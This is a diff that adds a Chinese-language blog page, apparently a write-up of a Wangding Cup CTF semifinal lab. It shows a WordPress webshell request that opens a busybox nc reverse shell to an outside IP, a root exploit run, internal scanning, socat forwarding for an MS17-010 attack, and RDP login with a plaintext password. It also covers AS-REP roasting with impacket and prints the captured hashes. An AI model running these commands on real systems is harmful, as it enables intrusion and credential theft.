@@ -1,0 +1,1085 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/99706997?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="<html>
+<body>
+<!--StartFragment--><!-- obsidian --><h1 data-heading='外网'>外网</h1>
+<p>很经典的wordpress后台getshell，插件直接写马就行，写的时候不要启用</p>
+<p>disable_function</p>
+<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,
+</code></pre>
+<p>按理说直接system马就行，eval的话是语言解释器，不是函数，禁用情况不知道，但是system会500，最后用eval了</p>
+<pre><code>GET /wp-content/plugins/hello.php?cmd=system('busybox+nc+211.159.175.21+2332+-e+/bin/bash'); HTTP/1.1
+Host: 39.98.123.229
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: wordpress_af049f20670cc3c1b6e4eccb75914352=admin%7C1790130763%7CQjDrGJMg6m0XRsmFNxIgDvzxI6657La0lGjtKvYbvVQ%7Cf6bc54e8e97ef6879b25593606389ca8b682aaa3c160e39372168f5aa1fc81ba; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_af049f20670cc3c1b6e4eccb75914352=admin%7C1790130763%7CQjDrGJMg6m0XRsmFNxIgDvzxI6657La0lGjtKvYbvVQ%7C9d7ee18aba1e2df5c088c14ae624283eb02ffe28f59c85852af3bc43f6526f5b; wp_lang=en_US; wp-settings-time-1=1789958476
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+</code></pre>
+<p>直接拿shell即可</p>
+<p>我打的比较晚，直接copy-fail一把梭了，实际上也不需要提权</p>
+<pre><code class='language-bash'>www-data@ubuntu-web:/tmp$ ls -al
+total 52
+drwxrwxrwt  2 root     root      4096 Sep 21 10:49 .
+drwxr-xr-x 18 root     root      4096 Sep 21 10:30 ..
+-rwxr-xr-x  1 www-data www-data  9800 Sep 21 10:48 22b008b7tcp
+-rwxr-xr-x  1 www-data www-data 29728 Sep 21 10:49 copy-fail-c-x86_64-musl
+www-data@ubuntu-web:/tmp$ ./copy-fail-c-x86_64-musl
+[+] target:    /usr/bin/su
+[+] payload:   1728 bytes (432 iterations)
+[+] page cache mutated; exec'ing target
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+</code></pre>
+<p>写个公钥即可</p>
+<h1 data-heading='内网'>内网</h1>
+<pre><code class='language-bash'>root@ubuntu-web:~# fscan -h 172.22.15.26/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.22.15.26    is alive
+(icmp) Target 172.22.15.18    is alive
+(icmp) Target 172.22.15.13    is alive
+(icmp) Target 172.22.15.24    is alive
+(icmp) Target 172.22.15.35    is alive
+[*] Icmp alive hosts len is: 5
+172.22.15.24:80 open
+172.22.15.18:80 open
+172.22.15.26:80 open
+172.22.15.26:22 open
+172.22.15.13:135 open
+172.22.15.18:139 open
+172.22.15.35:135 open
+172.22.15.24:135 open
+172.22.15.18:135 open
+172.22.15.13:88 open
+172.22.15.24:3306 open
+172.22.15.35:445 open
+172.22.15.24:445 open
+172.22.15.13:445 open
+172.22.15.18:445 open
+172.22.15.35:139 open
+172.22.15.24:139 open
+172.22.15.13:139 open
+[*] alive ports len is: 18
+start vulscan
+[*] NetInfo
+[*]172.22.15.18
+   [->]XR-CA
+   [->]172.22.15.18
+[*] NetInfo
+[*]172.22.15.24
+   [->]XR-WIN08
+   [->]172.22.15.24
+[*] NetInfo
+[*]172.22.15.35
+   [->]XR-0687
+   [->]172.22.15.35
+[*] NetInfo
+[*]172.22.15.13
+   [->]XR-DC01
+   [->]172.22.15.13
+[*] OsInfo 172.22.15.13 (Windows Server 2016 Standard 14393)
+[*] NetBios 172.22.15.35    XIAORANG\XR-0687
+[*] NetBios 172.22.15.13    [+] DC:XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393
+[*] NetBios 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393
+[+] MS17-010 172.22.15.24       (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
+[*] NetBios 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1
+[*] WebTitle http://172.22.15.26       code:200 len:39966  title:XIAORANG.LAB
+[*] WebTitle http://172.22.15.18       code:200 len:703    title:IIS Windows Server
+[*] WebTitle http://172.22.15.24       code:302 len:0      title:None 跳转url: http://172.22.15.24/www
+[+] PocScan http://172.22.15.18 poc-yaml-active-directory-certsrv-detect
+[*] WebTitle http://172.22.15.24/www/sys/index.php code:200 len:135    title:None
+已完成 18/18
+</code></pre>
+
+IP | NetInfo | NetBios/主机名 | 系统 | 开放端口 | WebTitle | 漏洞/检测
+-- | -- | -- | -- | -- | -- | --
+172.22.15.13 | XR-DC01 | DC:XR-DC01.xiaorang.lab | Windows Server 2016 Standard 14393 | 88,135,139,445 | - | -
+172.22.15.18 | XR-CA | XR-CA.xiaorang.lab | Windows Server 2016 Standard 14393 | 80,135,139,445 | http://172.22.15.18 code:200 len:703 title:IIS Windows Server | PocScan http://172.22.15.18 poc-yaml-active-directory-certsrv-detect
+172.22.15.24 | XR-WIN08 | WORKGROUP\XR-WIN08 | Windows Server 2008 R2 Enterprise 7601 Service Pack 1 | 80,135,139,445,3306 | http://172.22.15.24 code:302 len:0 title:None 跳转url: http://172.22.15.24/www  http://172.22.15.24/www/sys/index.php code:200 len:135 title:None | MS17-010
+172.22.15.35 | XR-0687 | XIAORANG\XR-0687 | - | 135,139,445 | - | -
+
+
+<p>18是证书服务，24有永恒之蓝，把24 445转出来打，msf走代理全是问题</p>
+<pre><code class='language-bash'>root@ubuntu-web:/# socat TCP-LISTEN:10086,reuseaddr,fork TCP4:172.22.15.24:445 &#x26;
+[1] 2581
+</code></pre>
+
+<img width='1536' height='1176' alt='Image' src='https://github.com/user-attachments/assets/8fbff877-9998-46d2-b4ad-4b753283eda1' />
+
+<p>直接秒了就行，机器不在域内，价值也不是很大，可以上去抓一下hash看看，不过没有价值信息，打CA得要个域用户，可以去看数据库配置文件在C:\phpstudy_pro\WWW\config\my.php</p>
+<pre><code class='language-bash'>┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc xfreerdp3 /v:172.22.15.24 /u:admin01 /p:'Config123!@#' /drive:share,/tmp/test/yunjing/dc /cert:ignore /sec:nla /tls:seclevel:0
+</code></pre>
+<pre><code>9ed9d2a1640b54c6eb9581ce334b79ab:wangwei
+cbdb423c741fcea593f0e522fdd417b0:wangfang
+c7122a1349c22cb3c009da3613d242ab:123456
+</code></pre>
+<p>也就这三个，这里我尝试smb撞域内机器都上不去，其实是<strong>AS-REP Roasting</strong></p>
+<p><strong>禁用了 Kerberos 预认证</strong>（<code>DONT_REQ_PREAUTH</code>）的账户。">
+<meta property="og:title" content="2022网鼎杯半决赛复盘">
+<meta property="og:description" content="<html>
+<body>
+<!--StartFragment--><!-- obsidian --><h1 data-heading='外网'>外网</h1>
+<p>很经典的wordpress后台getshell，插件直接写马就行，写的时候不要启用</p>
+<p>disable_function</p>
+<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,
+</code></pre>
+<p>按理说直接system马就行，eval的话是语言解释器，不是函数，禁用情况不知道，但是system会500，最后用eval了</p>
+<pre><code>GET /wp-content/plugins/hello.php?cmd=system('busybox+nc+211.159.175.21+2332+-e+/bin/bash'); HTTP/1.1
+Host: 39.98.123.229
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: wordpress_af049f20670cc3c1b6e4eccb75914352=admin%7C1790130763%7CQjDrGJMg6m0XRsmFNxIgDvzxI6657La0lGjtKvYbvVQ%7Cf6bc54e8e97ef6879b25593606389ca8b682aaa3c160e39372168f5aa1fc81ba; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_af049f20670cc3c1b6e4eccb75914352=admin%7C1790130763%7CQjDrGJMg6m0XRsmFNxIgDvzxI6657La0lGjtKvYbvVQ%7C9d7ee18aba1e2df5c088c14ae624283eb02ffe28f59c85852af3bc43f6526f5b; wp_lang=en_US; wp-settings-time-1=1789958476
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+</code></pre>
+<p>直接拿shell即可</p>
+<p>我打的比较晚，直接copy-fail一把梭了，实际上也不需要提权</p>
+<pre><code class='language-bash'>www-data@ubuntu-web:/tmp$ ls -al
+total 52
+drwxrwxrwt  2 root     root      4096 Sep 21 10:49 .
+drwxr-xr-x 18 root     root      4096 Sep 21 10:30 ..
+-rwxr-xr-x  1 www-data www-data  9800 Sep 21 10:48 22b008b7tcp
+-rwxr-xr-x  1 www-data www-data 29728 Sep 21 10:49 copy-fail-c-x86_64-musl
+www-data@ubuntu-web:/tmp$ ./copy-fail-c-x86_64-musl
+[+] target:    /usr/bin/su
+[+] payload:   1728 bytes (432 iterations)
+[+] page cache mutated; exec'ing target
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+</code></pre>
+<p>写个公钥即可</p>
+<h1 data-heading='内网'>内网</h1>
+<pre><code class='language-bash'>root@ubuntu-web:~# fscan -h 172.22.15.26/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.22.15.26    is alive
+(icmp) Target 172.22.15.18    is alive
+(icmp) Target 172.22.15.13    is alive
+(icmp) Target 172.22.15.24    is alive
+(icmp) Target 172.22.15.35    is alive
+[*] Icmp alive hosts len is: 5
+172.22.15.24:80 open
+172.22.15.18:80 open
+172.22.15.26:80 open
+172.22.15.26:22 open
+172.22.15.13:135 open
+172.22.15.18:139 open
+172.22.15.35:135 open
+172.22.15.24:135 open
+172.22.15.18:135 open
+172.22.15.13:88 open
+172.22.15.24:3306 open
+172.22.15.35:445 open
+172.22.15.24:445 open
+172.22.15.13:445 open
+172.22.15.18:445 open
+172.22.15.35:139 open
+172.22.15.24:139 open
+172.22.15.13:139 open
+[*] alive ports len is: 18
+start vulscan
+[*] NetInfo
+[*]172.22.15.18
+   [->]XR-CA
+   [->]172.22.15.18
+[*] NetInfo
+[*]172.22.15.24
+   [->]XR-WIN08
+   [->]172.22.15.24
+[*] NetInfo
+[*]172.22.15.35
+   [->]XR-0687
+   [->]172.22.15.35
+[*] NetInfo
+[*]172.22.15.13
+   [->]XR-DC01
+   [->]172.22.15.13
+[*] OsInfo 172.22.15.13 (Windows Server 2016 Standard 14393)
+[*] NetBios 172.22.15.35    XIAORANG\XR-0687
+[*] NetBios 172.22.15.13    [+] DC:XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393
+[*] NetBios 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393
+[+] MS17-010 172.22.15.24       (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
+[*] NetBios 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1
+[*] WebTitle http://172.22.15.26       code:200 len:39966  title:XIAORANG.LAB
+[*] WebTitle http://172.22.15.18       code:200 len:703    title:IIS Windows Server
+[*] WebTitle http://172.22.15.24       code:302 len:0      title:None 跳转url: http://172.22.15.24/www
+[+] PocScan http://172.22.15.18 poc-yaml-active-directory-certsrv-detect
+[*] WebTitle http://172.22.15.24/www/sys/index.php code:200 len:135    title:None
+已完成 18/18
+</code></pre>
+
+IP | NetInfo | NetBios/主机名 | 系统 | 开放端口 | WebTitle | 漏洞/检测
+-- | -- | -- | -- | -- | -- | --
+172.22.15.13 | XR-DC01 | DC:XR-DC01.xiaorang.lab | Windows Server 2016 Standard 14393 | 88,135,139,445 | - | -
+172.22.15.18 | XR-CA | XR-CA.xiaorang.lab | Windows Server 2016 Standard 14393 | 80,135,139,445 | http://172.22.15.18 code:200 len:703 title:IIS Windows Server | PocScan http://172.22.15.18 poc-yaml-active-directory-certsrv-detect
+172.22.15.24 | XR-WIN08 | WORKGROUP\XR-WIN08 | Windows Server 2008 R2 Enterprise 7601 Service Pack 1 | 80,135,139,445,3306 | http://172.22.15.24 code:302 len:0 title:None 跳转url: http://172.22.15.24/www  http://172.22.15.24/www/sys/index.php code:200 len:135 title:None | MS17-010
+172.22.15.35 | XR-0687 | XIAORANG\XR-0687 | - | 135,139,445 | - | -
+
+
+<p>18是证书服务，24有永恒之蓝，把24 445转出来打，msf走代理全是问题</p>
+<pre><code class='language-bash'>root@ubuntu-web:/# socat TCP-LISTEN:10086,reuseaddr,fork TCP4:172.22.15.24:445 &#x26;
+[1] 2581
+</code></pre>
+
+<img width='1536' height='1176' alt='Image' src='https://github.com/user-attachments/assets/8fbff877-9998-46d2-b4ad-4b753283eda1' />
+
+<p>直接秒了就行，机器不在域内，价值也不是很大，可以上去抓一下hash看看，不过没有价值信息，打CA得要个域用户，可以去看数据库配置文件在C:\phpstudy_pro\WWW\config\my.php</p>
+<pre><code class='language-bash'>┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc xfreerdp3 /v:172.22.15.24 /u:admin01 /p:'Config123!@#' /drive:share,/tmp/test/yunjing/dc /cert:ignore /sec:nla /tls:seclevel:0
+</code></pre>
+<pre><code>9ed9d2a1640b54c6eb9581ce334b79ab:wangwei
+cbdb423c741fcea593f0e522fdd417b0:wangfang
+c7122a1349c22cb3c009da3613d242ab:123456
+</code></pre>
+<p>也就这三个，这里我尝试smb撞域内机器都上不去，其实是<strong>AS-REP Roasting</strong></p>
+<p><strong>禁用了 Kerberos 预认证</strong>（<code>DONT_REQ_PREAUTH</code>）的账户。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://faabbi.github.io/post/2022-wang-ding-bei-ban-jue-sai-fu-pan.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
+<title>2022网鼎杯半决赛复盘</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">2022网鼎杯半决赛复盘</h1>
+<div class="title-right">
+    <a href="https://faabbi.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/faabbi/faabbi.github.io/issues/46" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody">
+
+<h1>外网</h1>
+<p>很经典的wordpress后台getshell，插件直接写马就行，写的时候不要启用</p>
+<p>disable_function</p>
+<pre class="notranslate"><code class="notranslate">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,
+</code></pre>
+<p>按理说直接system马就行，eval的话是语言解释器，不是函数，禁用情况不知道，但是system会500，最后用eval了</p>
+<pre class="notranslate"><code class="notranslate">GET /wp-content/plugins/hello.php?cmd=system('busybox+nc+211.159.175.21+2332+-e+/bin/bash'); HTTP/1.1
+Host: 39.98.123.229
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: wordpress_af049f20670cc3c1b6e4eccb75914352=admin%7C1790130763%7CQjDrGJMg6m0XRsmFNxIgDvzxI6657La0lGjtKvYbvVQ%7Cf6bc54e8e97ef6879b25593606389ca8b682aaa3c160e39372168f5aa1fc81ba; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_af049f20670cc3c1b6e4eccb75914352=admin%7C1790130763%7CQjDrGJMg6m0XRsmFNxIgDvzxI6657La0lGjtKvYbvVQ%7C9d7ee18aba1e2df5c088c14ae624283eb02ffe28f59c85852af3bc43f6526f5b; wp_lang=en_US; wp-settings-time-1=1789958476
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+</code><p><code class="notranslate"></code></p></pre><p></p>
+<p>直接拿shell即可</p>
+<p>我打的比较晚，直接copy-fail一把梭了，实际上也不需要提权</p>
+<pre class="notranslate"><code class="notranslate">www-data@ubuntu-web:/tmp$ ls -al
+total 52
+drwxrwxrwt  2 root     root      4096 Sep 21 10:49 .
+drwxr-xr-x 18 root     root      4096 Sep 21 10:30 ..
+-rwxr-xr-x  1 www-data www-data  9800 Sep 21 10:48 22b008b7tcp
+-rwxr-xr-x  1 www-data www-data 29728 Sep 21 10:49 copy-fail-c-x86_64-musl
+www-data@ubuntu-web:/tmp$ ./copy-fail-c-x86_64-musl
+[+] target:    /usr/bin/su
+[+] payload:   1728 bytes (432 iterations)
+[+] page cache mutated; exec'ing target
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+</code></pre>
+<p>写个公钥即可</p>
+<h1>内网</h1>
+<pre class="notranslate"><code class="notranslate">root@ubuntu-web:~# fscan -h 172.22.15.26/24
+<hr>
+</code><p><code class="notranslate">/ _ \     ___  ___ _ __ __ _  <strong><em>| | __<br>
+/ /</em>/</strong><em><em>/ <strong>|/ | '/ <em>` |/ __| |/ /<br>
+/ /</em>\</strong>____</em> \ (__| | | (</em>| | (<strong>|   &lt;<br>
+_</strong><em>/     |</em><strong>/_</strong>|<em>|  _</em>,<em>|___|</em>|_<br>
+fscan version: 1.8.4<br>
+start infoscan<br>
+(icmp) Target 172.22.15.26    is alive<br>
+(icmp) Target 172.22.15.18    is alive<br>
+(icmp) Target 172.22.15.13    is alive<br>
+(icmp) Target 172.22.15.24    is alive<br>
+(icmp) Target 172.22.15.35    is alive<br>
+[<em>] Icmp alive hosts len is: 5<br>
+172.22.15.24:80 open<br>
+172.22.15.18:80 open<br>
+172.22.15.26:80 open<br>
+172.22.15.26:22 open<br>
+172.22.15.13:135 open<br>
+172.22.15.18:139 open<br>
+172.22.15.35:135 open<br>
+172.22.15.24:135 open<br>
+172.22.15.18:135 open<br>
+172.22.15.13:88 open<br>
+172.22.15.24:3306 open<br>
+172.22.15.35:445 open<br>
+172.22.15.24:445 open<br>
+172.22.15.13:445 open<br>
+172.22.15.18:445 open<br>
+172.22.15.35:139 open<br>
+172.22.15.24:139 open<br>
+172.22.15.13:139 open<br>
+[</em>] alive ports len is: 18<br>
+start vulscan<br>
+[<em>] NetInfo<br>
+[</em>]172.22.15.18<br>
+[-&gt;]XR-CA<br>
+[-&gt;]172.22.15.18<br>
+[<em>] NetInfo<br>
+[</em>]172.22.15.24<br>
+[-&gt;]XR-WIN08<br>
+[-&gt;]172.22.15.24<br>
+[<em>] NetInfo<br>
+[</em>]172.22.15.35<br>
+[-&gt;]XR-0687<br>
+[-&gt;]172.22.15.35<br>
+[<em>] NetInfo<br>
+[</em>]172.22.15.13<br>
+[-&gt;]XR-DC01<br>
+[-&gt;]172.22.15.13<br>
+[<em>] OsInfo 172.22.15.13 (Windows Server 2016 Standard 14393)<br>
+[</em>] NetBios 172.22.15.35    XIAORANG\XR-0687<br>
+[<em>] NetBios 172.22.15.13    [+] DC:XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393<br>
+[</em>] NetBios 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393<br>
+[+] MS17-010 172.22.15.24       (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)<br>
+[<em>] NetBios 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1<br>
+[</em>] WebTitle <a href="http://172.22.15.26" rel="nofollow">http://172.22.15.26</a>       code:200 len:39966  title:XIAORANG.LAB<br>
+[<em>] WebTitle <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a>       code:200 len:703    title:IIS Windows Server<br>
+[</em>] WebTitle <a href="http://172.22.15.24" rel="nofollow">http://172.22.15.24</a>       code:302 len:0      title:None 跳转url: <a href="http://172.22.15.24/www" rel="nofollow">http://172.22.15.24/www</a><br>
+[+] PocScan <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a> poc-yaml-active-directory-certsrv-detect<br>
+[*] WebTitle <a href="http://172.22.15.24/www/sys/index.php" rel="nofollow">http://172.22.15.24/www/sys/index.php</a> code:200 len:135    title:None<br>
+已完成 18/18<br>
+</code></p></pre><p></p>
+<markdown-accessiblity-table><table role="table">
+<thead>
+<tr>
+<th>IP</th>
+<th>NetInfo</th>
+<th>NetBios/主机名</th>
+<th>系统</th>
+<th>开放端口</th>
+<th>WebTitle</th>
+<th>漏洞/检测</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>172.22.15.13</td>
+<td>XR-DC01</td>
+<td>DC:XR-DC01.xiaorang.lab</td>
+<td>Windows Server 2016 Standard 14393</td>
+<td>88,135,139,445</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>172.22.15.18</td>
+<td>XR-CA</td>
+<td>XR-CA.xiaorang.lab</td>
+<td>Windows Server 2016 Standard 14393</td>
+<td>80,135,139,445</td>
+<td><a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a> code:200 len:703 title:IIS Windows Server</td>
+<td>PocScan <a href="http://172.22.15.18" rel="nofollow">http://172.22.15.18</a> poc-yaml-active-directory-certsrv-detect</td>
+</tr>
+<tr>
+<td>172.22.15.24</td>
+<td>XR-WIN08</td>
+<td>WORKGROUP\XR-WIN08</td>
+<td>Windows Server 2008 R2 Enterprise 7601 Service Pack 1</td>
+<td>80,135,139,445,3306</td>
+<td><a href="http://172.22.15.24" rel="nofollow">http://172.22.15.24</a> code:302 len:0 title:None 跳转url: <a href="http://172.22.15.24/www" rel="nofollow">http://172.22.15.24/www</a>  <a href="http://172.22.15.24/www/sys/index.php" rel="nofollow">http://172.22.15.24/www/sys/index.php</a> code:200 len:135 title:None</td>
+<td>MS17-010</td>
+</tr>
+<tr>
+<td>172.22.15.35</td>
+<td>XR-0687</td>
+<td>XIAORANG\XR-0687</td>
+<td>-</td>
+<td>135,139,445</td>
+<td>-</td>
+<td>-</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p>18是证书服务，24有永恒之蓝，把24 445转出来打，msf走代理全是问题</p>
+<pre class="notranslate"><code class="notranslate">root@ubuntu-web:/# socat TCP-LISTEN:10086,reuseaddr,fork TCP4:172.22.15.24:445 &amp;
+[1] 2581
+</code></pre>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8fbff877-9998-46d2-b4ad-4b753283eda1"><img width="1536" height="1176" alt="Image" src="https://github.com/user-attachments/assets/8fbff877-9998-46d2-b4ad-4b753283eda1" style="max-width: 100%; height: auto; max-height: 1176px;; aspect-ratio: 1536 / 1176; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
+<p>直接秒了就行，机器不在域内，价值也不是很大，可以上去抓一下hash看看，不过没有价值信息，打CA得要个域用户，可以去看数据库配置文件在C:\phpstudy_pro\WWW\config\my.php</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc xfreerdp3 /v:172.22.15.24 /u:admin01 /p:'Config123!@#' /drive:share,/tmp/test/yunjing/dc /cert:ignore /sec:nla /tls:seclevel:0
+</code></pre>
+<pre class="notranslate"><code class="notranslate">9ed9d2a1640b54c6eb9581ce334b79ab:wangwei
+cbdb423c741fcea593f0e522fdd417b0:wangfang
+c7122a1349c22cb3c009da3613d242ab:123456
+</code></pre>
+<p>也就这三个，这里我尝试smb撞域内机器都上不去，其实是<strong>AS-REP Roasting</strong></p>
+<p><strong>禁用了 Kerberos 预认证</strong>（<code class="notranslate">DONT_REQ_PREAUTH</code>）的账户。攻击者可以向域控（DC）为这些账户请求 AS-REP 响应，该响应包含用用户密码哈希加密的数据，随后可离线破解出明文密码</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc impacket-GetNPUsers xiaorang.lab/ -usersfile user.txt -dc-ip 172.22.15.13 -no-pass -format hashcat -outputfile asrep.txt
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+</code><p><code class="notranslate">[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
+$krb5asrep$23$<a href="mailto:lixiuying@XIAORANG.LAB">lixiuying@XIAORANG.LAB</a>:3fdb7b45e6e8ed7d47ca3bfbd05b67c2$0634adfd2363496fd906b6d34465aa1ed42e5498a1f49ebd3fcb00b5ba91c778fc58bfa45913cf3f32372c7db8a8a153635da260f596d515b10f93b9423fd7467b30efac7a0133ea16614d2a73bcb70644685cf1d26f1f24ee647219a61b9a671dbf38bbebc732d2ed9c5f48229410604f6af712fb491d5030d129b90d656c44aa781ba18fc2cfbff2a99c7e587fa7032c9c20f564c4f2ae35024b205c1f04321a1dc55ad204cc13dda4cb557329c9fee011b2036b35045100ba2deec9e1efbd4e4da2d4bf646d4e59724d334677922b2d71ad789943f58cec86e15a2e03379fd5444aa7c69f00ba9a148643<br>
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.15.13:88  ...  OK<br>
